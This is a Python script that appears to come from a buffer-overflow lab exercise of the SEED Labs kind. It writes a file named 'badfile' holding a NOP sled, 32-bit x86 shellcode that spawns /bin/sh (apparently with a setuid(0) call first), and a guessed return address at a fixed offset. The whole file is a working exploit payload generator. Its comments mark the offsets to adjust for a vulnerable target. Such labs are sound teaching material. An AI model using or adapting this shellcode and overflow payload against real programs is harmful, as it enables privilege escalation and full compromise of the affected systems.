#!/usr/bin/python3
import sys

shellcode= (
   "\xbb\xe5\x62\x55\x56\xff\xd3\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
   "\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b"
   "\xcd\x80"
).encode('latin-1')


# Fill the content with NOP's
content = bytearray(0x90 for i in range(1014)) 
start = 1014 - len(shellcode)
content[start:start+len(shellcode)] = shellcode

##################################################################

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffb828 + 0x181   # Change this number 
offset = 666              	# Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

content[offset : offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
